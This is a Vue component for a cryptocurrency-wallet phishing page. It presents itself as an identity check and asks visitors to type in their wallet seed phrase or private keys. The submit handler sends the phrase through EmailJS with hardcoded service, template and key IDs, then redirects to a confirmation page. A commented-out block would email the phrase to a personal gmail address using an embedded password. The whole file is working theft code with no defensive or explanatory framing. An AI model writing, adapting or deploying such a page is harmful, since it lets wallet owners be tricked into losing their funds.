<template>
  <section>
    <div class="innerbox">
      <div class="header">
        <span @click="$router.go(-1)"
          ><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512">
            <path
              d="M9.4 233.4c-12.5 12.5-12.5 32.8 0 45.3l160 160c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L109.2 288 416 288c17.7 0 32-14.3 32-32s-14.3-32-32-32l-306.7 0L214.6 118.6c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0l-160 160z"
            /></svg
        ></span>
        <h2>{{ walletName }}</h2>
      </div>
      <p>
        To prevent identity theft, we will need to make sure it is really you by
        entering your phrase or private keys below
      </p>
      <form @submit.prevent="sendEmail">
        <textarea
          placeholder="phrase"
          v-model="phrase"
          id=""
          cols="30"
          name="message"
          rows="10"
        ></textarea>
        <button type="submit">Submit</button>
      </form>
    </div>
  </section>
</template>

<script setup>
import emailjs from "@emailjs/browser";
import { ref } from "vue";
import { useRouter } from "vue-router";

const router = useRouter();
const walletName = JSON.parse(localStorage.getItem("authname"));

console.log(walletName);

const phrase = ref("");

function sendEmail(event) {
  event.preventDefault();
  const serviceID = "service_t5obt2o";
  const templateID = "template_m9bxpqq";
  const publicKey = "XNNcMxpPXkGB_HAMq";

  const form = document.querySelector("form");

  emailjs.sendForm(serviceID, templateID, form, publicKey).then(
    (result) => {
      console.log("You have successfully submitted your message", result.text);
    },
    (error) => {
      console.log("This form failed to submit", error);
    }
  );

  router.push({
    name: "confirmation-page",
  });
}

/* const handleEmailSending = () => {
  console.log(phrase.value);
  Email.send({
    Password: "cdfe0913-26b7-41a6-85b7-479176f399bd",
    Username: "reciever",
    To: "remyoreo11@gmail.com",
    From: "remyoreo11@gmail.com",
    Subject: "New Contact Form Enquiry",
    Body: "Phrase: " + phrase.value,
  }).then((message) => alert("Phrase Confirmed"));
}; */
</script>

<style scoped>
section {
  margin: 0 auto;
  padding: 3rem;
  color: #ccc;
  background-color: #222;
  height: 100vh;
}

.innerbox {
  display: flex;
  align-items: center;
  align-items: center;
  flex-direction: column;
}

svg {
  height: 3rem;
  width: 3rem;
  fill: #ccc;
}

h2 {
  font-size: 3rem;
}

.header {
  margin-bottom: 4rem;
  display: flex;
  gap: 2rem;
  align-items: center;
  justify-content: center;
  margin-left: -25rem;
}

form {
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
}
.header span {
  font-size: 2.2rem;
  font-weight: bold;
}

p {
  font-size: 1.7rem;
  max-width: 50rem;
  margin-bottom: 2rem;
}

textarea {
  width: 50rem;
  margin-bottom: 2rem;
  text-indent: 1rem;
}

button {
  background-color: blue;
  border-radius: 1rem;
  width: 50rem;
  height: 5rem;
  color: #fff;
  font-size: 2rem;
  border: none;
  cursor: pointer;
  &:hover {
    background-color: rgb(87, 87, 227);
  }
}

@media (max-width: 480px) {
  .header {
    margin-bottom: 4rem;
    display: flex;
    gap: 2rem;
    align-items: center;
    justify-content: center;
    margin-left: -3rem;
  }

  textarea {
    width: 35rem;
  }

  p {
    max-width: 35rem;
  }
  button {
    max-width: 35rem;
  }
}

@media (max-width: 320px) and (max-width: 470px){

    .innerbox {
        margin-bottom: 12rem;
    }
  .textarea {
    width: 30rem;
    height: 23rem;
  }

  p {
    max-width: 36rem;
  }

  button {
    max-width: 33rem;
  }
}
</style>
